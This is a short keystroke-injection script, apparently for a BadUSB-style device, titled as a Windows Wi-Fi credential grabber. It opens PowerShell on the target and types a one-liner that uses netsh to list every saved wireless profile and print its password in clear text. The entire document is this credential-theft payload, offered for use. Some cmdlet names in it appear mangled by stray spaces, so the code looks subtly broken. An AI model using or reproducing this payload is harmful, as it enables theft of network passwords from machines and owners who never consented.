//WiFi Creds Grabber (WINDOWS)

//start Powershell
press("GUI r");
delay(500);
type("powershell\n");
delay(300);
type("(netsh wlan show profiles) | Select - String "\: (.+)$" | % { $name=$_.Matches.Groups[1].Value.Trim(); $_ } | % {(netsh wlan show profile name = "$name" key = clear)}  | Select - String "Key Content\W +\: (.+)$" | % { $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | % { [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | Format - Table - AutoSize");
press("ENTER");
